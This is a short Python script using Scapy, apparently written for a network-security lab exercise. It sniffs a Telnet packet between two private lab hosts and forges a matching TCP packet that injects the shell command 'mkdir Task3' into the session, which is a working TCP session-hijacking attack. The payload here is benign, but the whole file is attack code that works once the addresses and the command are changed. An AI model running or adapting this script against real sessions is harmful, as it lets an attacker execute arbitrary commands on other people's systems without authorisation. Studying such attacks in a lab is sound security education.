#!/usr/bin/python3
from scapy.all import *


def hijacking(pkt):
    s = pkt[TCP].ack
    a = pkt[TCP].seq + len(pkt[TCP].payload)
    srcport = pkt[TCP].sport
    dstport = pkt[TCP].dport

    ip = IP(src="10.9.0.6", dst="10.9.0.5")
    tcp = TCP(sport=dstport, dport=srcport, flags="A", seq=s, ack=a)

    data = "\rmkdir Task3\r"

    packet = ip / tcp / data
    ls(packet)
    send(packet, verbose=0)


f = "tcp and src host 10.9.0.5 and dst host 10.9.0.6 and src port 23"
sniff(iface="br-48fe231f7c9a", filter=f, prn=hijacking, count=1)
